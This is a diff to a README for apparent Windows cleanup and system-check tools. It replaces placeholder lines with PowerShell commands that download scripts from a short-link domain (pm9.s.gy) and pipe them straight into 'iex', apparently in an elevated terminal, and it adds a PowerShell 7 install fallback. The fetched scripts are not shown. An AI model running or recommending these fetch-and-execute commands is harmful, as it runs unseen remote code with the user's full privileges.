@@ -39,8 +39,13 @@
 - **Open PowerShell:** via `Win + X`, then `A`
 - **Enter Command:**
 ```powershell
-irm URL_HERE | iex
+irm pm9.s.gy/winclean.ps1 | iex
 ```
+**NOTE: If not working, enter this command:**
+```powershell
+winget install --id Microsoft.PowerShell --source winget
+```
+**Then, search for *PowerShell 7*, open and try again**
 
 <br>
 
@@ -98,8 +103,13 @@ irm URL_HERE | iex
 - **Open PowerShell:** via `Win + X`, then `A`
 - **Enter Command:**
 ```powershell
-irm URL_HERE | iex
+irm pm9.s.gy/syscheck.ps1 | iex
 ```
+**NOTE: If not working, enter this command:**
+```powershell
+winget install --id Microsoft.PowerShell --source winget
+```
+**Then, search for *PowerShell 7*, open and try again**
 
 <br>
 
